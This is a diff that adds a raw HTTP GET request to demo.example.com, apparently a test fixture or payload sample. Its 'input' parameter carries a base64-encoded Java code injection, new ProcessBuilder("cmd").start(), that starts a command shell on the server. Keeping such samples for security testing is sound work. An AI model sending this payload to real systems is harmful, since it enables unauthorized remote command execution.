@@ -1,0 +1,4 @@
+GET /a?input=aj1uZXcgUHJvY2Vzc0J1aWxkZXIoImNtZCIpLnN0YXJ0KCk%3D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
